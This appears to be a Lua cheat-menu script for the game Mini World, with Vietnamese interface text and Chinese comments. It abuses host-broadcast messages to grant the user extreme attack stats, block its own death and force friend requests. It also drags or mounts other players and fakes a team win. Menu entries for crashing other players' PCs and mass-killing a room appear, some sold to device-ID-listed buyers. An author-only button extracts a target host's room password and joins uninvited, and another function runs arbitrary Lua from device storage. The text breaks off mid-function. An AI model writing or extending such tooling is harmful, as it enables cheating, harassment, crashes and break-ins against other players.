        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function jjzd()
    if ClientCurGame:isInGame() then
        BanItem(15056)
        getglobal("MItemTipsFrame"):Hide()
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function gbfj()
    if ClientCurGame:isInGame() then
        local tdata = { teamid = 1, result = 1 }
        ScriptSupportTask:reportTaskToHost(SSTASKID.TEAM_RESULTS, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function gbtq()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "gamerule",
            [2] = "setWeather",
            [3] = { 5 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end


function dtly()
-- 获取玩家当前位置作为中心点
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x, center_y, center_z = x / 100, y / 100, z / 100

-- 球体半径
local radius = 10

-- 外层岩浆半径（比球体大2格）
local outer_radius = radius + 2

-- 最外层空气墙半径（比岩浆大3格）
local airwall_radius = outer_radius + 3


-- 第一步：生成内层空心球体（1221）
for ix = -radius, radius do
    for iy = -radius, radius do
        for iz = -radius, radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= radius - 0.5 and dist <= radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1221, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第二步：生成中层岩浆包裹层（5）
for ix = -outer_radius, outer_radius do
    for iy = -outer_radius, outer_radius do
        for iz = -outer_radius, outer_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= outer_radius - 0.5 and dist <= outer_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 5, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第三步：生成最外层空气墙（1001）
for ix = -airwall_radius, airwall_radius do
    for iy = -airwall_radius, airwall_radius do
        for iz = -airwall_radius, airwall_radius do
            local dist = math.sqrt(ix*ix + iy*iy + iz*iz)
            if dist >= airwall_radius - 0.5 and dist <= airwall_radius + 0.5 then
                local tdata = {
                    [1] = "block",
                    [2] = "placeBlock",
                    [3] = { 1001, center_x + ix, center_y + iy, center_z + iz, 0, -1 }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end
    end
end

-- 第四步：在单挑领域附近循环播放闪电（增强版）
ShowGameTipsWithoutFilter("#c00ff00Bắt đầu phát sét lặp quanh khu vực...")

threadpool:work(function()
    -- 生成36个闪电位置（球面分布）
    local lightning_positions = {}
    
    -- 生成多圈不同高度的闪电
    for radius_mult = 1, 3 do  -- 3圈不同距离
        local current_radius = airwall_radius + 3 + radius_mult * 2
        
        for angle1 = 0, 360, 30 do  -- 水平方向每30度一个
            for angle2 = -60, 60, 30 do  -- 垂直方向每30度一个
                local rad1 = math.rad(angle1)
                local rad2 = math.rad(angle2)
                
                local px = center_x + current_radius * math.cos(rad1) * math.cos(rad2)
                local py = center_y + current_radius * math.sin(rad2) + 5  -- 抬高5米
                local pz = center_z + current_radius * math.sin(rad1) * math.cos(rad2)
                
                table.insert(lightning_positions, {x = px, y = py, z = pz})
            end
        end
    end
    
    -- 添加一些随机位置的闪电
    for i = 1, 20 do
        local random_angle = math.random(0, 360)
        local random_height = math.random(-10, 20)
        local random_radius = airwall_radius + math.random(2, 8)
        
        local rad = math.rad(random_angle)
        local px = center_x + random_radius * math.cos(rad)
        local py = center_y + random_height
        local pz = center_z + random_radius * math.sin(rad)
        
        table.insert(lightning_positions, {x = px, y = py, z = pz})
    end
    
    ShowGameTipsWithoutFilter("#c00ff00Đã tạo tổng cộng " .. #lightning_positions .. " vị trí sét")
    
    local index = 1
    while true do
        -- 同时播放多个闪电（增加密度）
        for i = 1, 5 do  -- 每次同时播放5个闪电
            local pos_index = (index + i * 7) % #lightning_positions + 1
            local pos = lightning_positions[pos_index]
            
            -- 随机大小和持续时间
            local scale = math.random(2, 5)
            local duration = math.random(15, 25)
            
            CurWorld:playSoundAndParticleEffect(
                pos.x, pos.y, pos.z, 0, 0, 0, 0,
                pos.x, pos.y, pos.z,
                'particles/aotu_06_leishenzhichui.ent', scale, duration
            )
        end
        
        index = index + 1
        if index > #lightning_positions then
            index = 1
        end
        
        threadpool:wait(0.05)  -- 更快频率
    end
end)

end


   
   
function cggj()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), 99999999, 17 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function jdfk(aa)
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, (y / 100) - 1, z / 100
    local tdata = {
        [1] = "block",
        [2] = "placeBlock",
        [3] = { 1, new_x, new_y, new_z, 0, -1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function jdfk_all(aa)
    ShowGameTipsWithoutFilter('#cFF7aadBật thành công')
    jdfk_all_1 = true
    threadpool:work(function()
        while true do
            if not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
                break
            end
            jdfk(aa)
            threadpool:wait(0.1)
            if not jdfk_all_1 then
                ShowGameTipsWithoutFilter("#cFF7aadTắt thành công")
                break
            end
        end
    end)
end



function wjgr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 跟随功能（左停止，右开启选择目标跟随自己）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng theo dõi\nBên phải bật và chọn mục tiêu",
    "Chức năng theo dõi",
    nil,
    function(userData, btnType)
        if btnType == 0 then  -- 左侧：停止跟随
            _G.follow_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Đã tắt theo dõi")
            -- 恢复所有人移动权限
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.follow_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}
                            pcall(function()
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho toàn bộ người chơi")
                end
            end)

        elseif btnType == 1 then  -- 右侧：开启跟随
            _G.follow_enabled = true
            -- 判断是否在游戏内
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("#cFF0000Hãy vào phòng game trước")
                _G.follow_enabled = false
                return
            end

            LoadHomelandLuas()
            local uin_list = GetPlayerUinList()
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("#cFF0000Không có người chơi khác trong phòng")
                _G.follow_enabled = false
                return
            end

            -- 玩家列表UI配置
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu theo dõi",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end

            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Chọn người chơi sẽ theo bạn")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để xác nhận theo dõi")

            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            function ctrl:EnterFriendHomeBtn_OnClick()
                GetInst("UIManager"):Close("HomeEventRecord")
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                local targetUin = this:GetClientID()

                -- 白名单拦截

                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi"..targetUin..", liên tục đi theo bản thân")
                -- 跟随循环线程
                threadpool:work(function()
                    while _G.follow_enabled do
                        -- 获取自身坐标
                        local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
                        local new_x = x / 100
                        local new_y = y / 100
                        local new_z = z / 100
                        -- 导航跟随指令
                        local tdata = {}
                        tdata[1] = "actor";
                        tdata[2] = "tryNavigationToPos";
                        tdata[3] = {targetUin,new_x,new_y,new_z,true,true}
                        pcall(function()
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                        end)

                        threadpool:wait(0.1)
                    end
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp theo dõi đã kết thúc")
                end)
            end
        end
    end
)
end

function qzhy()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "SendFriendApply",
            [3] = { uin, AccountManager:getUin() }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Ép kết bạn")
end

function sqfw()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "player",
            [2] = "setCheckBoxScale",
            [3] = { AccountManager:getUin(), 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function qswj()
    ShowPlayerList(function(uin)
     if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "mountActor",
            [3] = { AccountManager:getUin(), uin, -1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cưỡi lên người chơi")
end


function pbsw()
-- 获取死亡界面整套MVC
local DeathFrameCtrl, DeathFrameModel, DeathFrameView = GetInst("MiniUIManager"):GetMVC("DeathFrameAutoGen")

-- 死亡弹窗拦截统一回调
local function BlockDeathUI()
    -- 关闭死亡界面容器
    GetInst("MiniUIManager"):CloseUI("DeathFrameAutoGen")
    -- 可选弹出提示，不需要可以删掉
    ShowGameTipsWithoutFilter("#RĐã chặn cửa sổ tử vong")
end

-- 重写死亡事件分发入口，拦截弹出逻辑
local Old_FGUIHandleEvent = DeathFrameCtrl.FGUIHandleEvent
function DeathFrameCtrl:FGUIHandleEvent(eventName)
    -- 捕获主角死亡事件直接拦截
    if eventName == "GE_MAINPLAYER_DIE" then
        -- 延迟极短时间，循环两次发送改血广播
        threadpool:delay(0.00000001, function()
            -- 循环2次发送setAtt指令
            for i = 1, 2 do
                local tdata = {}
                tdata[1] = "player";
                tdata[2] = "setAtt";
                tdata[3] = {AccountManager:getUin(),5201314,2}
                -- 向宿主广播任务消息
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
            end
        end)
        
        BlockDeathUI()
        return
    end
    -- 其余事件保留原有逻辑正常执行
    return Old_FGUIHandleEvent(self, eventName)
end

-- 额外兜底：重写界面刷新前置方法，就算界面要创建也直接拦截
local Old_BeforeRefresh = DeathFrameCtrl.BeforeRefresh
function DeathFrameCtrl:BeforeRefresh()
    BlockDeathUI()
    return Old_BeforeRefresh(self)
end
end

function ggmx()
    if ClientCurGame:isInGame() then
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), "mob_3501" }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function wqfm()
    if ClientCurGame:isInGame() then
        local nameList = { 5, 6, 7, 8, 10 }
        for _, enchantId in ipairs(nameList) do
            local tdata = {
                [1] = "actor",
                [2] = "addEnchant",
                [3] = { AccountManager:getUin(), 5, enchantId, 5 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
        ShowGameTipsWithoutFilter("#cFF7aadMột số phòng không sử dụng được")
    else
        ShowGameTipsWithoutFilter("#cFF7aadHãy vào phòng trước")
    end
end

function lua_load_OnClick()
    threadpool:work(function()
        local prefix = '/storage/emulated/0/'
        local file, err = io.open(prefix .. "amn.lua", "rb")
        
        if not file then
            ShowGameTipsWithoutFilter("Không phát hiện thấy tệp")
            return
        end
        
        local content = file:read("*a")
        file:close()
        
        local status, result = pcall(loadstring(content))
        if not status then
            ShowGameTipsWithoutFilter("Lỗi: " .. tostring(result))
        else
            result()
        end
    end)
end

-- ==================== 主菜单 ====================
function Functions(texta, gnaaa)
    local songbookv = GetInst("MiniUIManager"):GetMVC("main_songbookAutoGen")
    
-- ==================== SỬA HÀM RefreshLeftList ====================
function songbookv:RefreshLeftList()
    self.view.widgets.title:setText(texta[math.random(1, #texta)])
    self.view.widgets.n7:setText("Hai-Ca")
    self.view.widgets.n11:setText("")
    self.view.widgets.n12:setVisible(false)
    self.view.widgets.n29:setVisible(false)
    self.view.widgets.randomBtn:setVisible(false)
    self.view.widgets.btn1:setTitle("Xác nhận")
    self.view.widgets.n31:setText("con chó quay lại ăn mửa của nó")
    self.view.widgets.n10:setText("ID vật phẩm đang cầm:" .. CurMainPlayer:getCurToolID())
    
    -- ===== ĐẶT TÊN CHO CÁC VÙNG LỚN =====
    local tabNames = {
        [1] = "ANTI",                          -- Vùng 1: Chống hack/bảo vệ
        [2] = "ẢNH HƯỞNG NGƯỜI CHƠI",           -- Vùng 2: Tác động lên người chơi khác
        [3] = "BẢN THÂN",                       -- Vùng 3: Tác động lên bản thân
        [4] = "TOÀN PHÒNG",                     -- Vùng 4: Tác động toàn phòng
        [5] = "PHÁT NHẠC",                      -- Vùng 5: Phát nhạc
        [6] = "ẢNH HƯỞNG THẾ GIỚI",             -- Vùng 6: Tác động lên thế giới/môi trường
        [7] = "CODE HÌNH HỌC",                  -- Vùng 7: Hình học/vòng tròn
    }
    
    local strs = {}
    for i = 1, #gnaaa do
        if tabNames[i] then
            table.insert(strs, tabNames[i])
        else
            table.insert(strs, "📂 Vùng " .. i)
        end
    end
    
    self.view.widgets.leftListView:setNumItems(#strs)
    
    for i = 1, #strs do
        local itemObj = self.view.widgets.leftListView:getChildAt(i - 1)
        itemObj:getChild("title"):setText(strs[i])
        itemObj:setName(i)
    end
end
    
    
    
    
    function songbookv:RenderListItem2(scoreDef, itemObj, i)
        itemObj:getController("推荐乐器"):setSelectedIndex(7)
        itemObj:getChild("n16"):setText(scoreDef[1])
        itemObj:getChild("n18"):setText(scoreDef[4] or ("Số thứ tự" .. i))
        itemObj:getChild("n19"):setText("")
        itemObj.path = scoreDef[3] or scoreDef[1]
        itemObj.audioname = scoreDef[2]
    end
    
    function songbookv:RefreshList()
        self.view.widgets.n9:setText("Số chức năng:" .. #gnaaa[self.selectLeftIndex])
        self.view.widgets.listView:setNumItems(#gnaaa[self.selectLeftIndex])
        for i = 1, #gnaaa[self.selectLeftIndex] do
            local itemObj = self.view.widgets.listView:getChildAt(i - 1)
            self:RenderListItem2(gnaaa[self.selectLeftIndex][i], itemObj, i)
            itemObj:setName(i)
        end
    end
    
    function songbookv:okBtnClick(obj, context)
        local itemObj = self.view.widgets.listView:getChildAt(self.selectIndex - 1)
        if itemObj.audioname then
            threadpool:work(function() itemObj.audioname(itemObj.path) end)
            ShowGameTipsWithoutFilter("#cFF7aad" .. gnaaa[self.selectLeftIndex][self.selectIndex][1] .. "Đã bật")
        else
            ShowGameTipsWithoutFilter("#cff0000Chức năng chưa được cấp quyền hoặc không tồn tại")
        end
    end
    
    function songbookv:ResourceCenterClick(obj, context)
        threadpool:work(function()
            if not ResourceCenterMidiEntryIsOpen() then
                ShowGameTipsWithoutFilter(GetS(120101))
                return
            end
            GetInst("UIManager"):Open("ResourceCenter", { lockMidi = true })
        end)
    end
    
    GetInst("MiniUIManager"):OpenUI("main_songbook", "miniui/miniworld/music_roleplay", "main_songbookAutoGen")
end

-- ==================== 主菜单按钮 ====================
if CurWorld and CurMainPlayer then
GetInst("QQMusicPlayerManager"):ShowUI()
getglobal("AccChangeColorBtn"):Show()
    TaskTrackFrame = getglobal("TaskTrackFrame")


TaskTrackFrame:Show();
getglobal("TaskTrackFrameTitle"):SetText("#b#cFFAAFFH#cFFBBEEA#cFFCCDDI#cFFDDCCCA  x   #cFFAAFFm#cFFBBEEx#cFFCCDDi#cFFDDCCi")
		getglobal("TaskTrackFrameDesc"):SetText("#b#cFFAAFFH#cFFBBEEA#cFFCCDDI#cFFDDCCCA  x   #cFFAAFFm#cFFBBEEx#cFFCCDDi#cFFDDCCi", 255, 255, 255);
		SetItemIcon(getglobal("TaskTrackFrameIcon"), 10119)
	getglobal("TaskTrackFrame"):SetPoint("topright", "PlayMainFrame", "topright", -1200, 150 )
    getglobal("PlayMainFrameFly"):Show();
    getglobal("PlayMainFrameFly"):SetPoint("top", "PlayMainFrameFlyUp", "bottom", -80, 2);
    
    
    function SetMenuFrameFAQBtn()
    getglobal("SetMenuFrame"):Hide();
    
    -- 获取当前设备的ID
    local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho tác giả", 3)
        return
    end
ShowTextInputSafe(function(text)
        local raw_Uin = text
        local roomID = ""
        local hostPassword = ""
        local num_Uin = tonumber(raw_Uin)
        local query_Uin
        
        if num_Uin then
            query_Uin = num_Uin < 1000000000 and (num_Uin + 1000000000) or num_Uin
        else
            query_Uin = raw_Uin
        end
        
        local ret, data = BuddyManager:query_friend_info(query_Uin, true)
        
        if ret == 0 and type(data) == "table" then
            local statusinfo = data.statusinfo or {}
            roomID = tostring(statusinfo[2] or "")
            local roominfo_str = statusinfo[3]
            
            if type(roominfo_str) == "string" and roominfo_str ~= "" then
                local f, err = loadstring("return " .. roominfo_str)
                if f then
                    local ok, roominfo = pcall(f)
                    if ok and type(roominfo) == "table" then
                        local pwd = roominfo.hostPassword or ""
                        if type(pwd) == "string" and pwd ~= "" then
                            hostPassword = pwd
                        end
                    end
                end
            end
        end
        
        if roomID == "" then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #RNgười chơi này chưa vào phòng"..hostPassword)
        elseif string.find(roomID, "-", 1, true) ~= nil then
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #RKhông hỗ trợ theo dõi máy chủ đám mây")
        else
            FriendChat_ReqFriendRoomByUin(raw_Uin, nil, true, true)
            ShowGameTipsWithoutFilter("#cFFAAFFThông #cFFBBEEbáo #cFFCCDDnhắc #cFFDDCCnhở#cFFEEBB: #YGiải mã mật khẩu thành công"..hostPassword)
        end
        
        local roomDesc = GetInst("RoomService"):ReqQuickUpPlayerRoomInfo(raw_Uin)
        if roomDesc then
            roomDesc.lcl_outTime = os.time() + 1
            GetInst("RoomService"):EnterRoomByDesc(0, false, roomDesc)
        end
    end)
end
    
    
  ---------

    
      
        
          ----------自定义召唤生物  
    
    
    
 --------------------
 

function SwithLangFrame_OnShow()
	if ClientCurGame and ClientCurGame:isInGame() then
		ClientCurGame:setOperateUI(true)
	end
	local oldGetS = GetS
GetS = function(id)
    if id == 3499 then
        return "Giao diện chức năng VIP"
    end
    return oldGetS(id)
end
getglobal("SwitchLangFrameTitleFrameName"):SetText(GetS(3499))

	if lang_now == 999 then
		lang_now = get_game_lang()
	end
	local isOversea = get_game_env() >= 10
	if isOversea then
		local lang_index
		if lang_now == 2 then
			lang_index = 0
		elseif lang_now > 2 then
			lang_index = lang_now - 1
		else
			lang_index = lang_now
		end
		getglobal("SwitchLangFrameLayout"):Hide()
		getglobal("SwitchLangFrameLayoutOversea"):Show()
		getglobal("SwitchLangFrameLayoutOverseaLang" .. lang_index):Checked()
	else
		getglobal("SwitchLangFrameLayoutOversea"):Hide()
		getglobal("SwitchLangFrameLayout"):Show()
		getglobal("SwitchLangFrameLayoutLang" .. lang_now):Checked()
	end
	setLangChecked(lang_now)
	Log("call SwithLangFrame_OnShow, lang_now=" .. lang_now)
	local column_ = 0
	local row_ = 0
	local show_cc = 0
	local hasExcepted = false
	for i = 0, 16 do
		local hide_lang = hidden_lang_list()
		for k, v in pairs(hide_lang) do
			local btn_name_prefix = "SwitchLangFrameLayoutLang"
			if isOversea then
				v = v - 1
				btn_name_prefix = "SwitchLangFrameLayoutOverseaLang"
			end
			if v == i then
				local btn_ = getglobal(btn_name_prefix .. v)
				if btn_ then
					btn_:Hide()
					hasExcepted = true
					break
				end
			end
		end
		if not hasExcepted then
			local btn_, txt_
			if isOversea then
				btn_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutOverseaLang" .. i .. "Tips")
			else
				btn_ = getglobal("SwitchLangFrameLayoutLang" .. i)
				txt_ = getglobal("SwitchLangFrameLayoutLang" .. i .. "Tips")
			end
			if get_game_lang() == gb_enumLang.LANGUAGE_THA and txt_ and isOversea and i ~= 0 and i ~= 6 and i ~= 7 then
				txt_:SetFontType("BlackFont35")
			end
			if btn_ then
				if isOversea then
					if GameLanguageCsv and GameLanguageCsv.idLanguage then
						if txt_ then
							local langIndex = lang_list[i + 1]
							local def = GameLanguageCsv:idLanguage(langIndex)
							local langTxt = def.name
							local canOperate = def.optional
							if tonumber(canOperate) == 0 then
								btn_:Hide()
							end
							txt_:SetText(langTxt)
						end
					elseif txt_ then
						if i == 0 then
		         txt_:SetText(GetS(3497))
						elseif i == 1 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9998 then
        return "Chống PC hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9998))
elseif i == 2 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9997 then
        return "Làm treo PC"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9997))
elseif i == 3 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9996 then
        return "Hạ gục lặp toàn phòng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9996))
elseif i == 4 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9995 then
        return "Hạ gục tức thì bỏ qua danh sách trắng"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9995))
elseif i == 5 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9994 then
        return "Tùy chỉnh bắn vật thể ném"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9994))
elseif i == 6 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9993 then
        return "Chỉ định C người chơi"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9993))

elseif i == 7 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9992 then
        return "Siêu hạ gục tức thì"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9992))
elseif i == 8 then
							local oldGetS = GetS
GetS = function(id)
    if id == 9991 then
        return "Chỉ định phát vô hạn"
    end
    return oldGetS(id)
end
txt_:SetText(GetS(9991))
						elseif i == 15 then
							txt_:SetText("Malaysia")
						else
							txt_:SetText(GetS(973 + i))
						end
					end
				elseif i < 3 then
					txt_:SetText(GetS(3495 + i))
				elseif i == 15 then
					txt_:SetText("Malaysia")
				else
					txt_:SetText(GetS(972 + i))
				end
			end
		end
		hasExcepted = hasExcepted and false
	end
	if isOversea then
		getglobal("SwitchLangFrameLayoutOversea"):UpdateLayout()
	else
		getglobal("SwitchLangFrameLayout"):UpdateLayout()
	end
	if GetInst("MiniUIManager") then
		GetInst("MiniUIManager"):PushNoMvcUIViewTemplateToHistory("SwitchLangFrame", SwithLangFrame_OnHide)
	end
end


-- ============================================================================
-- 函数名：setLangChecked
-- 功能：设置语言选择界面中当前选中语言的按钮状态（禁用/启用）
-- 参数：op - 当前选中的语言ID（数值类型）
-- 返回值：无
-- ============================================================================
function setLangChecked(op)
    -- 判断当前游戏环境是否为海外版（游戏环境ID >= 10 为海外版）
    local isOversea = get_game_env() >= 10
    
    -- ========== 海外版语言列表配置 ==========
    if isOversea then
        -- 海外版语言ID映射表（索引从0开始，与UI按钮索引对应）
        -- 注意：这里的顺序决定了按钮的排列顺序
        lang_list = {
            2,   -- 索引0：语言ID 2
            1,   -- 索引1：语言ID 1
            3,   -- 索引2：语言ID 3
            4,   -- 索引3：语言ID 4
            5,   -- 索引4：语言ID 5
            6,   -- 索引5：语言ID 6
            7,   -- 索引6：语言ID 7
            8,   -- 索引7：语言ID 8
            9,   -- 索引8：语言ID 9
            10,  -- 索引9：语言ID 10
            11,  -- 索引10：语言ID 11
            12,  -- 索引11：语言ID 12
            13,  -- 索引12：语言ID 13
            14,  -- 索引13：语言ID 14
            15,  -- 索引14：语言ID 15
            16,   -- 索引15：语言ID 16
            17
        }
        
        -- 遍历海外版语言列表，设置每个按钮的状态
        for k, v in pairs(lang_list) do
            -- 根据索引构建按钮名称（海外版按钮名称格式：SwitchLangFrameLayoutOverseaLang + 索引）
            -- 注意：k从1开始，需要减1得到0基索引
            local btn = getglobal("SwitchLangFrameLayoutOverseaLang" .. k - 1)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮（表示当前选中）
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
                    btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
        
    -- ========== 国内版语言列表配置 ==========
    else
        -- 遍历国内版语言列表（lang_list 应该在其他地方定义）
        for k, v in pairs(lang_list) do
            -- 国内版按钮名称格式：SwitchLangFrameLayoutLang + 语言ID
            local btn = getglobal("SwitchLangFrameLayoutLang" .. v)
            
            if btn then
                -- 如果当前语言ID匹配，则禁用该按钮
                if v == op then
                    Log("v==" .. op)  -- 调试日志：匹配成功
          btn:Enable()       -- 启用按钮（可点击）
                else
                    -- 如果不匹配，则启用并取消选中状态
                    Log("v!=" .. op)  -- 调试日志：不匹配
                    btn:Enable()       -- 启用按钮（可点击）
                    btn:DisChecked()   -- 取消选中状态（取消高亮/勾选）
                end
            end
        end
    end
end



-- ============================================================================
-- 函数名：SwithLangFrame_OnClick
-- 功能：处理语言切换界面中语言按钮的点击事件
-- 参数：op - 点击的语言ID（数值类型），特殊值999表示关闭界面
-- 返回值：无
-- ============================================================================
function SwithLangFrame_OnClick(op)
    -- 打印调试日志，记录点击的语言ID和当前语言ID
    Log("call SwithLangFrame_OnClick=" .. op .. "/" .. lang_now)
    
    -- ========== 情况1：点击关闭按钮（op == 999） ==========
    if op == 999 then
        -- 直接隐藏语言切换界面，不进行任何语言切换操作
        getglobal("SwitchLangFrame"):Hide()
        
           elseif op == 1 then
        -- 执行防电脑功能
        Log("执行防电脑功能")
        ExecuteAntiBotLogic()
    -- ========== 情况2：点击的语言与当前语言相同 ==========
    elseif op == 3 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bdn()
        
        elseif op == 4 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        xhjs()
        elseif op == 5 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        mswsbmd()
        elseif op == 6 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdtzw()
        elseif op == 7 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        zdcr()
        elseif op == 8 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        cjms()
        elseif op == 9 then
        -- 执行防电脑功能
        Log("执行崩电脑功能")
        bfsp()
    -- ========== 情况3：点击了不同的语言 ==========
    
          
    end
end



function bfsp()
local currentDeviceID = ClientMgr:getDeviceID()
    
    -- 检查设备是否在白名单中
    if not author8[currentDeviceID] then
        ShowGameTipsWithoutFilter("Nút này chỉ dành cho người mua", 3)
        return
    end
    
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 全局开关，控制视频广播循环
_G.video_broadcast_loop = false

GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái tắt\nBên phải bật",
